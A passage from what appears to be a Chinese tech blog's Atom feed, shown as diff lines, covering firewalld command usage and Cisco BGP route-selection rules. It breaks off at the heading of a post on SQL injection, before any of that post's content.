+&lt;pre class=&quot;example&quot;&gt;
+firewall-cmd --state
+&lt;/pre&gt;
+&lt;p&gt;
+2、查看已激活的Zone信息
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+firewall-cmd --get-active-zones
+&lt;/pre&gt;
+&lt;p&gt;
+3、查看指定接口的zone信息
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+firewall-cmd --get-zone-of-interface=eth0
+&lt;/pre&gt;
+&lt;p&gt;
+4、查看指定级别的接口
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+firewall-cmd --zone=public --list-interfaces
+&lt;/pre&gt;
+&lt;p&gt;
+5、查看指定级别的所有信息
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+firewall-cmd --zone=public --list-all
+&lt;/pre&gt;
+&lt;p&gt;
+6、查看所有级别中被允许的服务
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+friewall-cmd --get-service
+&lt;/pre&gt;
+&lt;p&gt;
+7、添加smtp服务至work zone
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+firewall-cmd --zone=work --add-service=smtp
+&lt;/pre&gt;
+&lt;p&gt;
+8、从work zone中移除smtp服务
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+firewall-cmd --zone=work --remove-service=smtp
+&lt;/pre&gt;
+&lt;p&gt;
+9、允许tcp端口8000至dmz级别
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+firewall-cmd --zone=dmz --add-port=8000/tcp
+firewall-cmd --reload
+&lt;/pre&gt;
+&lt;p&gt;
+10、允许范围内udp端口至public级别，设置永久生效
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+firewall-cmd --zone=public --add-port=8000-9000/udp --permanent
+&lt;/pre&gt;
+&lt;p&gt;
+11、设置public为默认的信任级别
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+firewall-cmd --set-default-zone=public
+&lt;/pre&gt;
+
+
+
+
+&lt;!-- more-forword --&gt;
+
+
+&lt;!-- more --&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;</content><author><name>jsf</name></author><category term="shell" /></entry><entry><title type="html">BGP选路原则</title><link href="http://localhost:4000/network/2018/12/30/bgp%E9%80%89%E8%B7%AF%E5%8E%9F%E5%88%99/" rel="alternate" type="text/html" title="BGP选路原则" /><published>2018-12-30T00:00:00+08:00</published><updated>2018-12-30T00:00:00+08:00</updated><id>http://localhost:4000/network/2018/12/30/bgp%E9%80%89%E8%B7%AF%E5%8E%9F%E5%88%99</id><content type="html" xml:base="http://localhost:4000/network/2018/12/30/bgp%E9%80%89%E8%B7%AF%E5%8E%9F%E5%88%99/">&lt;div id=&quot;outline-container-sec-1&quot; class=&quot;outline-2&quot;&gt;
+&lt;h2 id=&quot;sec-1&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; BGP选路原则&lt;/h2&gt;
+&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;
+&lt;/div&gt;&lt;div id=&quot;outline-container-sec-1-1&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-1-1&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.1&lt;/span&gt; 优选具有最大Weight值的路由&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-1&quot;&gt;
+&lt;p&gt;
+1、cisco私有，越大越优先；
+&lt;/p&gt;
+
+&lt;p&gt;
+2、本路由器有效，不会传递给任何BGP邻居；
+&lt;/p&gt;
+
+&lt;p&gt;
+3、范围为0～65536；
+&lt;/p&gt;
+
+&lt;p&gt;
+4、从其它邻居学习过来的路由，在本地weight默认为0；
+&lt;/p&gt;
+
+&lt;p&gt;
+5、本地network产生的路由weight为32768；
+&lt;/p&gt;
+
+&lt;p&gt;
+6、本地重分发的直连接口路由、静态路由weight值为32768；
+&lt;/p&gt;
+
+&lt;p&gt;
+7、本地汇总产生的BGP的路由weight值为32768。
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;outline-container-sec-1-2&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-1-2&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.2&lt;/span&gt; 选择具有最大Local-Preference的路由&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-2&quot;&gt;
+&lt;p&gt;
+1、Local-Preference值越大，越优先；
+&lt;/p&gt;
+
+&lt;p&gt;
+2、默认本地始发的路由的Local-Preference为100，从EBGP peer接受的路由（本地赋值）的
+Local-preference为100；
+&lt;/p&gt;
+
+&lt;p&gt;
+3、Local-Preference属性仅在IBGP peer之间传递，不能在EBGP peer之间传递；
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;outline-container-sec-1-3&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-1-3&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.3&lt;/span&gt; 优选起源于本地的路由&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-3&quot;&gt;
+&lt;p&gt;
+起源于本地的路由，如本地network、aggregate、redistribute即下一跳地址为0.0.0.0的路由，在BGP
+路由表中本路由器通告的下一跳为0.0.0.0。
+&lt;/p&gt;
+
+&lt;p&gt;
+该比较原则主要指本地一条IGP路由进入BGP路由表时，使用不同的方式如network或redistribute时，
+这些方式之间存在优先级: network&amp;gt;redistribute&amp;gt;aggregate，该原则并不会作为BGP的选路策略。
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;outline-container-sec-1-4&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-1-4&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.4&lt;/span&gt; 优先as-path最短路由&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-4&quot;&gt;
+&lt;p&gt;
+1、选择长度最小的as-path路由；
+&lt;/p&gt;
+
+&lt;p&gt;
+2、其它as-apth比较: (1)、在做聚合路由时，使用as-set产生的as-apth列表的{}中的as号长度只算一个as号的长度。(2)、在联盟内的as-path列表()中的as号长度不做计算依据；
+&lt;/p&gt;
+
+&lt;p&gt;
+3、当向EBGP peer邻居通告路由时，将自己的as号加在as-path列表的最左端，向IBGP peer通告路由时，
+不会对as-path列表做修改；
+&lt;/p&gt;
+
+&lt;p&gt;
+4、针对EBGP peer可以修改as-path列表；
+&lt;/p&gt;
+
+&lt;p&gt;
+5、可以配置跳过as-path长度的比较；
+&lt;/p&gt;
+
+&lt;p&gt;
+6、修改as-path长度可以作为BGP选路的一种策略。
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;outline-container-sec-1-5&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-1-5&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.5&lt;/span&gt; Origin&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-5&quot;&gt;
+&lt;p&gt;
+Origin属性的优先顺序为：IGP &amp;gt; EGP &amp;gt; incomplete
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;outline-container-sec-1-6&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-1-6&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.6&lt;/span&gt; MED&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-6&quot;&gt;
+&lt;p&gt;
+1、优选MED最小的路由，值越小越优先；
+&lt;/p&gt;
+
+&lt;p&gt;
+2、默认只比较来自同一邻居的as的BGP路由的MED值；
+&lt;/p&gt;
+
+&lt;p&gt;
+3、MED在as之间交换，MED发送非EBGP对等体，这些路由器在as内传播MED，不能传递给下一个as；
+&lt;/p&gt;
+
+&lt;p&gt;
+4、使用network或redistibute将IGP路由引入BGP时，MED将继承IGP路由的Metric（直连路由Metric=0）；
+&lt;/p&gt;
+
+&lt;p&gt;
+5、使用aggregate-address方式引入路由，MED值为空；
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;outline-container-sec-1-7&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-1-7&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.7&lt;/span&gt; 优选EBGP邻居更新的路由&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-7&quot;&gt;
+&lt;p&gt;
+优选EBGP邻居发来的路由（相对于IBGP邻居学习的路由），在联邦EBGP和IBGP中优选联邦EBGP路由。当使用前六条原则仍然无法决定路由的优先顺序时，会根据EBGP路由优先于IBGP路由的原则进行优选，该原则不会作为BGP选路原则。
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;outline-container-sec-1-8&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-1-8&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.8&lt;/span&gt; 优选BGP next-hop最近的邻居&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-8&quot;&gt;
+&lt;p&gt;
+比较到达BGP路由路径属性中的next-hop地址的IGP Metric值，越小越优先，该值与MED没有任何关系，
+几乎很少使用该原则作为BGP选路原则。
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;outline-container-sec-1-9&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-1-9&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.9&lt;/span&gt; 等价负载均衡&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-9&quot;&gt;
+&lt;p&gt;
+如果有多条来自相同相邻as的路由并通过maximum-apths使多条路径可用，则将所有开销相同的路由放入本地路由表中。
+&lt;/p&gt;
+
+&lt;p&gt;
+前面的8条选路路径都无法选出最优路由时，并且在BGP中配置了maximum-paths时，将进行等价负载均衡。(1)、必须具有相同的路径属性，如weight、LP、as-apth（长度及as号都要相同）(2)、如果不关联ibgp关键字，那么只会对EBGP路由做等价负载均衡
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;outline-container-sec-1-10&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-1-10&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.10&lt;/span&gt; 优选最老的EBGP路由&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-10&quot;&gt;
+&lt;p&gt;
+根据EBGP路由接收顺序，主要针对EBGP路由，优先使用最老的路由，在IBGP环境中，这条规则并不适用。
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;outline-container-sec-1-11&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-1-11&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.11&lt;/span&gt; BGP邻居RID越小越优先&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-11&quot;&gt;
+&lt;p&gt;
+1、router-id越小，越优先；
+&lt;/p&gt;
+
+&lt;p&gt;
+2、上面几条选路原则已经完成了EBGP路由的优先选择，应此后三条都时针对于IBGP路由。
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;outline-container-sec-1-12&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-1-12&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.12&lt;/span&gt; 优选cluster—list最短的路由&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-12&quot;&gt;
+&lt;p&gt;
+1、长度越小，越优先；
+&lt;/p&gt;
+
+&lt;p&gt;
+2、仅存在反射器的情况下，才会进行cluster-list长度的比较，RR在执行路由反射动作时会将自己的
+cluster id 添加值cluster-list中。
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;outline-container-sec-1-13&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-1-13&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.13&lt;/span&gt; 选择邻居IP地址最小的路由&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-13&quot;&gt;
+&lt;p&gt;
+1、邻居的ip地址越小，越优先。
+&lt;/p&gt;
+
+
+
+
+&lt;!-- more-forword --&gt;
+
+
+&lt;!-- more --&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;</content><author><name>jsf</name></author></entry><entry><title type="html">基础SQL注入</title><link href="http://localhost:4000/%E5%AE%89%E5%85%A8/2018/12/20/%E5%9F%BA%E7%A1%80sql%E6%B3%A8%E5%85%A5/" rel="alternate" type="text/html" title="基础SQL注入" /><published>2018-12-20T00:00:00+08:00</published><updated>2018-12-20T00:00:00+08:00</updated><id>http://localhost:4000/%E5%AE%89%E5%85%A8/2018/12/20/%E5%9F%BA%E7%A1%80sql%E6%B3%A8%E5%85%A5</id><content type="html" xml:base="http://localhost:4000/%E5%AE%89%E5%85%A8/2018/12/20/%E5%9F%BA%E7%A1%80sql%E6%B3%A8%E5%85%A5/">&lt;div id=&quot;outline-container-sec-1&quot; class=&quot;outline-2&quot;&gt;
 &lt;h2 id=&quot;sec-1&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; 手工sql注入&lt;/h2&gt;
 &lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;
 &lt;p&gt;
